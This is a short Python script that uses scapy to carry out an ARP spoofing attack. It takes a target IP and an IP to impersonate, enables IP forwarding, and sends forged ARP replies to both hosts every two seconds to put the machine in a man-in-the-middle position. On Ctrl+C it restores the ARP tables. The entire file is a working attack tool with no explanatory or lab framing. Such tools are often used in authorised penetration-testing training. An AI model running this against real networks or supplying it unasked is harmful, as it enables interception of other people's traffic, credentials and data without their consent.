#!/usr/bin/env python
import argparse
import time
import subprocess
import sys
import scapy.all  as scapy

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="The target ip address A.B.C.D")
    parser.add_argument("-s", "--spoof", dest="spoof", help="The ip address A.B.C.D to spoof")
    args = parser.parse_args()
    if not args.target:
        parser.error("[-] Please give target ip address, use --help for more info")
        exit()
    if not args.spoof:
        parser.error("[-] Please give the ip address to spoof, use --help for more info")
    return args


def get_mac(ip_addr):
    LIMITE = 10
    answered = None
    t = 1
    while not answered and t <= LIMITE:
        arp_req = scapy.ARP(pdst=ip_addr)#create ARP pacquet
        broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
        arp_broadcast_req = broadcast / arp_req
        answered = scapy.srp(arp_broadcast_req, timeout=1, verbose=False)[0]
        t += 1
        if t > LIMITE : 
            print ("[-] Unable to get mac-address of : "+ ip_addr)
            exit()

    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
def restore(src_ip, dest_ip):
    src_mac = get_mac(src_ip)
    dest_mac = get_mac(dest_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False, count=4)


args = get_arguments()
#enable IP routing forwarding Linux
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
count=0
try:
    while True:
        spoof(args.target, args.spoof)
        spoof(args.spoof, args.target)
        count += 2
        print("\r[+] Sent " + str(count) + " packets"),#dynamique printing
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected ....Reseting ARP")
    restore(args.target, args.spoof)
    restore(args.spoof, args.target)
    #disable ip forwarding on linux
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward",shell=True)
    print("[-] .....Quiting")
    